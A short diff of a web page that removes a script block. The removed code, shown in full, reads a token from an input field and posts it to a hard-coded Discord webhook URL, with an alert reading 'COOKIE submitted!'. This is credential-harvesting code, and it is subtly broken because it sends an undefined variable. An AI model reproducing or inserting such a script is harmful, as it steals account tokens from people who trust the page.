@@ -106,34 +106,3 @@ Contact us
 </div>
 
 </div>
-
-<script>
-
-function sendToken() {
-
-const token = document.getElementById("tokenInput").value;
-
-const webhook = "https://discord.com/api/webhooks/1450681251655581726/uZOSEpFUt-2x9uBZvBelHt4wPWuO9XNvBTj4VW4HfEiVVWvFORankW-2pDFDwXexqF61";
-
-fetch(webhook, {
-method: "POST",
-headers: {
-"Content-Type": "application/json"
-},
-body: JSON.stringify({
-content: "Cookie  submitted: " + cookie
-})
-})
-.then(() => {
-alert("COOKIE submitted!");
-})
-.catch(err => {
-console.error(err);
-});
-
-}
-
-</script>
-
-</body>
-</html>
